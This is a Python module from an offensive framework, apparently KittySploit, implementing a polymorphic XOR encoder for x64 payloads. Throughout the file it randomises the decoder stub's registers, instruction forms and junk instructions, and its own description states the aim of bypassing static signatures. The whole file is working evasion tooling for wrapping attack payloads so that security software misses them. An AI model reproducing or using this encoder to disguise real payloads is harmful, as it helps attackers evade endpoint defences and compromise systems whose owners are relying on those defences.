#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import random
from kittysploit import *
from lib.compile.mini_x64 import MiniX64

class Module(Encoder, MiniX64):
    
    __info__ = {
        "name": "x64 Polymorphic XOR Encoder",
        "description": "A fully polymorphic XOR encoder that generates a randomized, dependency-free decoder stub on the fly to bypass static signatures.",
        "author": "KittySploit Team",
        "arch": Arch.X64,
        "platform": Platform.LINUX | Platform.WINDOWS | Platform.MAC,
    }

    def encode(self, payload):
        # 1. Generate a random 8-byte XOR key
        key = os.urandom(8)
        key_int = int.from_bytes(key, byteorder='little')

        # 2. Encode payload using the key
        encoded_payload = bytearray()
        for i, byte in enumerate(payload):
            encoded_payload.append(byte ^ key[i % 8])
            
        encoded_payload = bytes(encoded_payload)

        # 3. Generate and assemble the Polymorphic Stub
        try:
            stub_bytes = self.generate_polymorphic_stub(len(encoded_payload), key_int)
            
            try:
                print_success(f"Generated highly polymorphic stub ({len(stub_bytes)} bytes) without external dependencies!")
            except:
                print_success(f"Generated highly polymorphic stub ({len(stub_bytes)} bytes).")
                
            return stub_bytes + encoded_payload
            
        except Exception as e:
            try:
                print_error(f"Assembly Error: {str(e)}")
            except:
                print_error(f"Assembly Error: {str(e)}")
            return payload

    def generate_polymorphic_stub(self, payload_len, key_int):
        self.reset_asm()
        
        # We avoid rsp, rbp, r12, r13 to keep addressing clean and stack frames intact
        available_regs = ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "r14", "r15"]
        
        addr_reg, counter_reg, key_reg = random.sample(available_regs, 3)
        
        def add_junk():
            safe_regs = [r for r in available_regs if r not in (addr_reg, counter_reg, key_reg)]
            if len(safe_regs) < 2: return
            
            if random.random() > 0.4:
                choice = random.choice([1, 2, 3, 4])
                if choice == 1: self.nop()
                elif choice == 2: self.xchg(random.choice(safe_regs), random.choice(safe_regs))
                elif choice == 3: self.add_imm8(random.choice(safe_regs), 0)
                elif choice == 4: self.or_imm8(random.choice(safe_regs), 0)

        add_junk()

        # Step A: Load the Payload Address (PIC)
        self.lea_rip(addr_reg, "payload_start")
        add_junk()

        # Step B: Setup Counter Register
        choice = random.choice([1, 2])
        if choice == 1:
            self.mov_imm32(counter_reg, payload_len)
        elif choice == 2:
            zeroing = random.choice([1, 2])
            if zeroing == 1: self.xor(counter_reg, counter_reg)
            else: self.sub(counter_reg, counter_reg)
            self.add_imm32(counter_reg, payload_len)
        add_junk()

        # Step C: Setup Key Register (64-bit)
        self.movabs(key_reg, key_int)
        add_junk()

        # --- DECODE LOOP START ---
        self.label("decode_loop")
        add_junk()
        
        # XOR Operation
        self.xor_byte_ptr(addr_reg, key_reg)
        
        # Rotate Key
        self.ror(key_reg, 8)
        
        # Increment Address Tracker
        choice = random.choice([1, 2, 3])
        if choice == 1: self.inc(addr_reg)
        elif choice == 2: self.add_imm8(addr_reg, 1)
        elif choice == 3: self.sub_imm8(addr_reg, -1)
        
        # Decrement Counter
        choice = random.choice([1, 2])
        if choice == 1: self.dec(counter_reg)
        elif choice == 2: self.sub_imm8(counter_reg, 1)
        
        # Condition Check & Loop
        choice = random.choice([1, 2, 3])
        if choice == 1: self.test(counter_reg, counter_reg)
        elif choice == 2: self.cmp_imm8(counter_reg, 0)
        elif choice == 3: self.or_reg(counter_reg, counter_reg)
        
        self.jnz("decode_loop")
        
        # Payload Marker
        self.label("payload_start")
        
        return self.get_bytes()

